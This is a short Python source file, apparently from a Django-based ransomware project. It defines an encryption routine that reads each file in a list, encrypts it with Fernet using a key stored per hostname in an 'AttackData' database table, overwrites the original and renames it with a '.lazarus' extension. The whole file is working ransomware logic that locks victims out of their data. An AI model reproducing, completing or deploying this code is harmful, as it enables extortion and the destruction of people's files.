from cryptography.fernet import Fernet
import os
from ransomwareapp.models import AttackData
import socket


system_name = socket.gethostname()

def encryption(file_list,encrypt_key):
    # key generation
    key = encrypt_key
    
    # using the generated key
    fernet = Fernet(key)
    
    filesize=0
    for filename in file_list:
        
        filesize += os.path.getsize(filename)
        with open(filename, 'rb') as file:
                original = file.read()

        # if the systemname is already in database
        if AttackData.objects.filter(SystemName = system_name).first():
             fernet = Fernet(AttackData.objects.filter(SystemName = system_name).first().EncryptionKey)
        
        # encrypting the file
        encrypted = fernet.encrypt(original)

        # opening the file in write mode and
        # writing the encrypted data
        with open(filename, 'wb') as encrypted_file:
            x=filename.split('.')
            encrypted_filename = x[0] + '.lazarus'
            # print(file)
            encrypted_file.write(encrypted)
            os.rename(filename,encrypted_filename)
    return filesize